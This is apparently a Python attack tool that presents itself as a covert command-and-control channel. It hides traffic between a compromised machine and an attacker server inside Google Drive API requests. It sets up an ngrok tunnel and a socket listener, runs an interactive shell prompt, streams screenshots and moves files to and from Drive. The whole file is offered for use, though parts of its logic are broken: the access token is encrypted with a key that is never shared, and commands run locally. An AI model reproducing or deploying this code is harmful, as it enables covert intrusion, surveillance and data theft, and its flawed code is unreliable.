# This script integrates Google Drive API functionality to facilitate communication between the compromised system and the attacker-controlled server, thereby potentially hiding the traffic within legitimate Google Drive communication.

print('''\033[93m
                                            
                             ..........                             
                            ++-:::::::::                            
                           ++++=:::::::::                           
                          +++++++:::::::::                          
                         ++++++++*:::::::::                         
                        +++++++++  :::::::::                        
                       +++++++++    :::::::::                       
                      +++++++++      :::::::::.                     
                    :+++++++++        :::::::::.                    
                    ++++++++*+++++++++++++++++++                    
                     ++++++**++++++++++++++++++                     
                      *+++*+++++++++++++++++++                      
                       *+*+++++++++++++++++++            
                       
  ________                      __         ________         __              
 /  _____/  ____   ____   ____ |  |   ____ \______ \_______|__|__  __ ____  
/   \  ___ /  _ \ /  _ \ / ___\|  | _/ __ \ |    |  \_  __ \  \  \/ // __ \ 
\    \_\  (  <_> |  <_> ) /_/  >  |_\  ___/ |    `   \  | \/  |\   /\  ___/ 
 \______  /\____/ \____/\___  /|____/\___  >_______  /__|  |__| \_/  \___  >
        \/             /_____/           \/        \/                    \/ 
                                                                                  
\033[0m''')

# Importing necessary libraries
import subprocess
import time
import socket
import base64
import os
import pyautogui
from pyvirtualdisplay import Display
import random
import shutil
import requests
from Crypto.Cipher import ARC4
import secrets

# Colors for output formatting
BLUE = '\033[94m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# Function to generate a random key for encryption
def generate_random_key(length):
    return secrets.token_bytes(length)

# Function to get attacker information
def get_attacker_info():
    attacker_ip = input("[+] Enter the IP for the reverse shell: ")
    return attacker_ip

# Function to encrypt access token using RC4
def encrypt_access_token(token, key_length):
    key = generate_random_key(key_length)
    cipher = ARC4.new(key)
    encrypted_token = cipher.encrypt(token.encode())
    return base64.b64encode(encrypted_token).decode()

# Main function
def main():
    try:
        # Gathering required information
        access_token = input("[+] Enter your Google Drive API access token: ")
        ip = get_attacker_info()
        port = input("[+] Enter the port number for the reverse shell and ngrok: ")
        key_length = int(input("[+] Enter the length of the RC4 key (in bytes): "))

        print(GREEN + "[*] Starting ngrok tunnel..." + RESET)
        # Starting ngrok tunnel
        ngrok_process = subprocess.Popen(['ngrok', 'tcp', port])
        time.sleep(3)  # Giving ngrok some time to establish the tunnel

        # Encrypting access token
        access_token_encrypted = encrypt_access_token(access_token, key_length)

        # Defining headers for Google Drive API
        headers = {
            "Authorization": f"Bearer {access_token_encrypted}",
            "Content-Type": "application/json",
            "User-Agent": "GoogleDrive-API-Client/1.0",
            "Connection": "keep-alive",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9"
        }

        # Creating socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, int(port)))  # Binding to the port specified by the attacker
        s.listen(1)
        print(YELLOW + "[!] Waiting for incoming connection..." + RESET)
        client_socket, addr = s.accept()

        # Starting shell
        shell = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        # Starting display
        display = Display(visible=0, size=(800, 600))
        display.start()

        # Main loop
        while True:
            command = input(RED + "[*] Bear>> " + RESET)
            if command.lower() == "exit":
                break
            
            time.sleep(random.uniform(1, 5))
            
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            stdout = result.stdout
            stderr = result.stderr

            client_socket.send(command.encode())

            if stdout:
                print(GREEN + stdout + RESET)
                print(GREEN + "[+] Command executed successfully!" + RESET)
                client_socket.send(stdout.encode())
            else:
                print(RED + "[!] No output returned from the victim's machine." + RESET)

            if stderr:
                client_socket.send(stderr.encode())

            if command.lower() == "screen":
                screen = pyautogui.screenshot()
                screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

                client_socket.send(screen_data.encode())

                while True:
                    try:
                        screen = pyautogui.screenshot()
                        screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

                        client_socket.send(screen_data.encode())

                        time.sleep(0.1)
                    except KeyboardInterrupt:
                        print("\nScreen session ended.")
                        break

            elif command.lower() == "upload":
                file_path = input("Enter the path of the file to upload: ")
                file_name = os.path.basename(file_path)
                with open(file_path, "rb") as f:
                    file_data = f.read()
                url = "https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
                response = requests.post(url, headers=headers, data=file_data)
                client_socket.send(response.text.encode())

            elif command.lower() == "download":
                file_path = input("Enter the path of the file to download: ")
                url = f"https://www.googleapis.com/drive/v3/files/{file_path}?alt=media"
                response = requests.get(url, headers=headers)
                with open(os.path.basename(file_path), "wb") as f:
                    f.write(response.content)
                client_socket.send("File downloaded successfully.".encode())

            elif command.lower() == "list_files":
                url = "https://www.googleapis.com/drive/v3/files"
                response = requests.get(url, headers=headers)
                client_socket.send(response.text.encode())

        # Closing sockets and display
        client_socket.close()
        s.close()
        display.stop()

        # Terminating ngrok process
        ngrok_process.terminate()

    except Exception as e:
        print(RED + f"Error: {e}" + RESET)

if __name__ == "__main__":
    main()
